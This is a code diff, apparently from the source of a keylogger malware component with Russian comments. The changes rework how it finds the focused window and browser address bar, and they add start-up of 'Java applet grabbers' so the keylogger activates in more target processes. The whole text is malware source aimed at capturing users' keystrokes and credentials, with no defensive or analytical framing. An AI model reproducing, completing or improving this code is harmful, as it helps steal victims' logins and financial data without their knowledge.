@@ -1033,9 +1033,11 @@ HWND KeyLoggerSearchAddressBarWND()
 
 	// Определяем самое нижнее окно
 	HWND Parent;
+
+	if (KLG.FocusWnd == NULL)
+		KLG.FocusWnd = (HWND)pGetFocus();
 	HWND Wnd = KLG.FocusWnd;
-	if (Wnd == NULL)
-		Wnd = (HWND)pGetFocus();
+
 
 	if (Wnd == NULL)
 		return NULL;
@@ -1354,8 +1356,17 @@ bool KeyLogger::Start()
     	return true;
 
 	KLG.Dialogs = NULL;
+
+	bool CanStart = false;
+	// Инициализируем граберы в ява аплетах
+
+	#ifdef JavaAppletGrabbersH
+		CanStart = InitializeJavaAppletGrabbers();
+	#endif
+
+
     // Проверяем наличие процесса в списке обрабатываемых процессов
-	if (IsSupportProcess())
+	if (!CanStart && IsSupportProcess())
 	{
 		//  получаем имя процесса. Имя приложения без разрешения
 		KLGDBG("UnKLG", "Процесс %s есть в списке обрабатываемых процессов", GlobalKeyLogger->ProcessName);
@@ -1377,8 +1388,11 @@ bool KeyLogger::Start()
 	// Запускаем кейлогер только в случае наличия хотя-бы
 	// одной системы
 
-	if (List::Count(GlobalKeyLogger->Systems) == 0)
-    	return false;
+	if (!CanStart)
+		CanStart = List::Count(GlobalKeyLogger->Systems) > 0;
+
+	if (!CanStart) return false;
+
 
 	KLGDBG("UnKLG", "Запускаем кейлогер в процесе %s", GlobalKeyLogger->ProcessName);
 
